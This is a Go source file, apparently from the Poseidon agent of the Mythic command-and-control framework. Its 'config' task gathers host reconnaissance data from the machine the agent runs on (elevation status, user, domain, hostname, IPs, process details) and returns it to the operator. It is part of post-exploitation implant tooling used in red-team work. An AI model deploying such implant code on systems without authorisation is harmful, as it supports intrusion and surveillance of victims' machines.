package config

import (
	// Poseidon

	"encoding/json"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Run - Function that executes the shell command
func Run(task structs.Task) {
	msg := task.NewResponse()
	hostConfig := map[string]interface{}{
		"elevated":     functions.IsElevated(),
		"arch":         functions.GetArchitecture(),
		"domain":       functions.GetDomain(),
		"os":           functions.GetOS(),
		"process_name": functions.GetProcessName(),
		"user":         functions.GetUser(),
		"pid":          functions.GetPID(),
		"host":         functions.GetHostname(),
		"ips":          functions.GetCurrentIPAddress(),
	}
	hostConfigBytes, err := json.Marshal(hostConfig)
	if err != nil {
		msg.SetError(err.Error())
	} else {
		msg.UserOutput = string(hostConfigBytes)
	}
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
